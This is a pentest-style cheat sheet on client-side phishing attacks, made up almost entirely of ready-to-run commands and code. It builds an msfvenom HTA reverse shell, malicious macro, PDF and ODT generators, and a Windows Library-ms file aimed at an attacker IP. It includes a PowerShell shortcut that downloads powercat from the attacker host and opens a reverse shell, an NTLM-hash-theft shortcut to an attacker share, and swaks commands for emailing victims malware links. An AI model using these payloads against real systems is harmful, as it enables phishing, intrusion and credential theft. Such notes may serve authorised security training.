# 🎣 Client-Side Attacks

## Information Gathering

```shell
exiftool <file>
canarytokens.com # generate a fake URL to collect victim data
```

## Attacks

> [evil_macro.py](https://github.com/rodolfomarianocy/Evil-Macro/)

> [malicious-pdf.py](https://github.com/jonaslejon/malicious-pdf)

> [MMG-LO](https://github.com/0bfxgh0st/MMG-LO)

```shell
# create a malicious HTA with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o file.hta

# generate a malicious macro for a reverse shell in powershell using base64 for .doc
python evil_macro.py -l <ip> -p <port> -o macro.txt

# generate a malicious PDF file
python3 malicious-pdf.py burp-collaborator-url

# generate a malicious odt file
python mmg-odt.py windows <ip> <port> 
```

### Windows Library

In Windows, create a file **config.Library-ms**, put the attack IP in the URL, and save it.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.152</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Now create a shortcut called **install** with the attack machine IP:

```shell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.152:3333/powercat.ps1'); powercat -c 192.168.45.152 -p 4444 -e powershell"
```

Transfer them to the attack machine, start a WebDAV server to serve the shortcut, a Python HTTP server to serve the powercat script, a listener to receive the reverse shell, and send the email.

### Create shortcuts

#### Windows

```ps
$LnkFile = "C:\users\<user>\desktop\Services.lnk"
PS C:\> $WshShell = New-Object -ComObject WScript.Shell
PS C:\> $Shortcut = $WshShell.CreateShortcut($LnkFile)
PS C:\> $Shortcut.TargetPath = "\\192.168.45.191\test\trick.bat"
PS C:\> $Shortcut.Save()
```

#### Linux

> [ntlm_theft.py](https://github.com/Greenwolf/ntlm_theft)

```shell
python ntlm_theft/ntlm_theft.py -g lnk -s 192.168.45.191 -f Services
```

### Sending Emails

```shell
swaks -t <victim(s)_email> -f <from_email> --server <smtp_server> --body 'click me http://<YOUR_IP>/<MALWARE>' --header "Subject: Important" --add-header "Really: 1.0" --add-header "Content-Type: text/html"  [--attach <ATTACHED_FILE>]

sendEmail -t <victim(s)_email> -u <subject> -m <message> -a <attachment> -s <smtp_server> -f <from_email> -xu <user> -xp <pass>
```
